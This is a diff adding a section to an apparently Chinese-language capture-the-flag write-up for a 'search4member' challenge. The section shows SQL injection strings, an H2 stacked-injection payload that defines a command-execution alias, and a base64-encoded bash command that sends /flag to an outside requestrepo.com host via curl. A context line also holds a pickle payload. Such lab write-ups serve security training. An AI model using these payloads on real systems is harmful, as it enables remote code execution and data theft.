@@ -212,9 +212,33 @@ pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D
 
 ### [search4member]
 
+sql注入--堆叠注入实现rce
 
+尝试`a' or 1=1 --+`，得到表中所有数据
 
+回显有三个字段。查询库名：
 
+```
+a' union select 1,2,database() --+
+```
+
+![image-20240221210856523](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221210856523.png)
+
+[Spring Boot Actuator H2 RCE漏洞复现](https://cn-sec.com/archives/721279.html)
+
+```
+a'; CREATE ALIAS SHELL AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}';'
+```
+
+rce，通过dnslog外带
+
+https://requestrepo.com/
+
+```
+a';CALL SHELL('bash -c {echo,Y3VybCBgY2F0IC9mbGFnYC5kN3VobWE4ai5yZXF1ZXN0cmVwby5jb20=}|{base64,-d}|{bash,-i}');'
+```
+
+![image-20240221225510335](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240221225510335.png)
 
 ## misc
 
